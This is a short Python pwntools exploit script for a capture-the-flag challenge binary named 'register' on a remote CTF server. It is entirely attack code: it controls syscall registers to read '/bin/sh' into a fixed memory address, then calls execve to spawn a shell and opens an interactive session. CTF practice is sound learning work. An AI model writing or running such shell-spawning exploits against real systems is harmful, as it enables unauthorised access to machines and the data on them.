#!/usr/bin/python
from pwn import *

#p = process("./register")
p = remote("ctf.j0n9hyun.xyz", 3026)
elf = ELF("./register")
data = 0x601068 
binsh = "/bin/sh\x00"

def register(rax, rdi, rsi, rdx):
    p.sendlineafter(": ", str(rax))
    p.sendlineafter(": ", str(rdi))
    p.sendlineafter(": ", str(rsi))
    p.sendlineafter(": ", str(rdx))
    p.sendlineafter(": ", str(0))
    p.sendlineafter(": ", str(0))
    p.sendlineafter(": ", str(0))


register(0, 0, data, 10)
p.send(binsh)
register(59, data, 0, 0)
sleep(5)

p.interactive()
